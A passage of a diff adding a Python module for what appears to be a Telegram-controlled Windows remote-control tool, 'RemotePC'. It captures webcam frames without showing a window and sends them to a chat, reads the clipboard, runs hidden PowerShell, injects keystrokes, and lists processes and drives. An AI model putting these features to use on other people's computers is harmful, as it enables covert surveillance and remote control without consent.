@@ -1,0 +1,193 @@
+ces" in line:
+                current = "audio"
+                continue
+            if current and "Alternative name" not in line:
+                match = re.search(r'"([^"]+)"', line)
+                if match:
+                    name = match.group(1).strip()
+                    if name and name not in sections[current]:
+                        sections[current].append(name)
+        return sections
+    except Exception:
+        LOGGER.exception("Failed to list ffmpeg devices")
+        return {"video": [], "audio": []}
+
+
+def get_webcam_device():
+    configured = str(CONFIG.get("webcam_device", "")).strip()
+    if configured:
+        return configured
+    devices = _ffmpeg_devices().get("video", [])
+    return devices[0] if devices else "Integrated Camera"
+
+
+def capture_webcam_file(output=None):
+    if not FFMPEG_PATH:
+        raise RuntimeError("ffmpeg.exe tidak ditemukan. Taruh ffmpeg.exe di folder script/bin atau PATH.")
+    ensure_temp_dir()
+    output = str(output or (Path(TEMP_DIR) / f"webcam_{int(time.time())}.jpg"))
+    device = get_webcam_device()
+    cmd = [
+        FFMPEG_PATH, "-y", "-hide_banner", "-loglevel", "error",
+        "-f", "dshow", "-i", f"video={device}", "-frames:v", "1", output,
+    ]
+    result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True,
+                            creationflags=CREATE_NO_WINDOW, timeout=30)
+    if result.returncode != 0 or not Path(output).exists():
+        raise RuntimeError((result.stderr or "Webcam capture failed")[-500:])
+    return output
+
+
+def capture_webcam(chat_id=None):
+    try:
+        output = capture_webcam_file()
+        return send_telegram_file(output, f"📹 Webcam: {get_webcam_device()}", chat_id=chat_id)
+    except Exception as exc:
+        LOGGER.exception("Webcam capture failed")
+        return send_telegram_message(f"❌ Gagal mengambil webcam: {exc}", chat_id)
+
+
+def clean_temp_files():
+    min_age = int(CONFIG.get("features", {}).get("clean_temp_min_age_minutes", 30)) * 60
+    cutoff = time.time() - max(0, min_age)
+    candidates = [
+        os.environ.get("TEMP", ""),
+        os.path.join(os.environ.get("SystemRoot", ""), "Temp"),
+        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Temp"),
+    ]
+    total_size = 0
+    total_files = 0
+    skipped = 0
+    seen = set()
+    for folder in candidates:
+        if not folder:
+            continue
+        root_path = os.path.abspath(folder)
+        if root_path.lower() in seen or not os.path.isdir(root_path):
+            continue
+        seen.add(root_path.lower())
+        for root, _dirs, files in os.walk(root_path):
+            for name in files:
+                file_path = os.path.join(root, name)
+                try:
+                    st = os.stat(file_path)
+                    if st.st_mtime > cutoff:
+                        skipped += 1
+                        continue
+                    os.remove(file_path)
+                    total_size += st.st_size
+                    total_files += 1
+                except Exception:
+                    skipped += 1
+    return f"🧹 {total_files} file sementara dihapus ({total_size / (1024**2):.2f} MB), {skipped} dilewati"
+
+
+def get_drive_info():
+    try:
+        drives = []
+        for part in psutil.disk_partitions(all=False):
+            if os.name == "nt" and "cdrom" in part.opts.lower():
+                continue
+            try:
+                usage = psutil.disk_usage(part.mountpoint)
+            except Exception:
+                continue
+            drives.append(
+                f"📀 *{part.device}*\n```\n"
+                f"Total: {usage.total / (1024**3):.2f} GB\n"
+                f"Used : {usage.used / (1024**3):.2f} GB\n"
+                f"Free : {usage.free / (1024**3):.2f} GB\n"
+                f"Used%: {usage.percent}%\nType : {part.fstype}\n```"
+            )
+        return "\n\n".join(drives) or "Tidak ada drive yang dapat dibaca."
+    except Exception as exc:
+        LOGGER.exception("Drive info failed")
+        return f"❌ Gagal mendapatkan info drive: {exc}"
+
+
+def get_clipboard_text():
+    try:
+        value = pyperclip.paste()
+        return value if isinstance(value, str) else str(value)
+    except Exception as exc:
+        return f"❌ Tidak dapat mengakses clipboard: {exc}"
+
+
+def show_popup(message):
+    try:
+        text = str(message)[:4000]
+        def worker():
+            try:
+                import ctypes
+                ctypes.windll.user32.MessageBoxW(0, text, "RemotePC Notification", 0x40)
+            except Exception:
+                LOGGER.exception("Popup failed")
+        threading.Thread(target=worker, name="popup", daemon=True).start()
+        return True
+    except Exception:
+        LOGGER.exception("Popup startup failed")
+        return False
+
+
+def speak_text(message):
+    try:
+        env = os.environ.copy()
+        env["REMOTEPC_TTS_TEXT"] = str(message)[:5000]
+        script = (
+            "Add-Type -AssemblyName System.Speech; "
+            "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; "
+            "$s.Speak($env:REMOTEPC_TTS_TEXT)"
+        )
+        subprocess.Popen(
+            ["powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", script],
+            env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=CREATE_NO_WINDOW
+        )
+        return True
+    except Exception:
+        LOGGER.exception("TTS failed")
+        return False
+
+
+def _escape_sendkeys_text(text: str) -> str:
+    mapping = {
+        "+": "{+}", "^": "{^}", "%": "{%}", "~": "{~}",
+        "(": "{(}", ")": "{)}", "[": "{[}", "]": "{]}",
+        "{": "{{}", "}": "{}}",
+    }
+    return "".join(mapping.get(ch, ch) for ch in str(text))
+
+
+def type_text_safe(text: str) -> bool:
+    try:
+        shell = win32com.client.Dispatch("WScript.Shell")
+        shell.SendKeys(_escape_sendkeys_text(text))
+        return True
+    except Exception:
+        LOGGER.exception("Typing failed")
+        return False
+
+
+def get_top_processes(limit=10):
+    processes = []
+    try:
+        for proc in psutil.process_iter(["pid", "name", "cpu_percent", "memory_percent"]):
+            try:
+                processes.append((
+                    proc.info.get("name") or "?",
+                    float(proc.info.get("cpu_percent") or 0),
+                    int(proc.info.get("pid") or 0),
+                    float(proc.info.get("memory_percent") or 0),
+                ))
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                continue
+        processes.sort(key=lambda x: (x[1], x[3]), reverse=True)
+        rows = [f"{i+1}. {name} [PID {pid}] - {cpu:.1f}% CPU / {mem:.1f}% RAM"
+                for i, (name, cpu, pid, mem) in enumerate(processes[:limit])]
+        return f"📊 *{limit} Proses Teratas:*\n```\n" + "\n".join(rows) + "\n```"
+    except Exception as exc:
+        LOGGER.exception("Process list failed")
+        return f"❌ Gagal mendapatkan daftar proses: {exc}"
+
+
+CRITICAL_PROCESS_NAMES = {
+    "sys
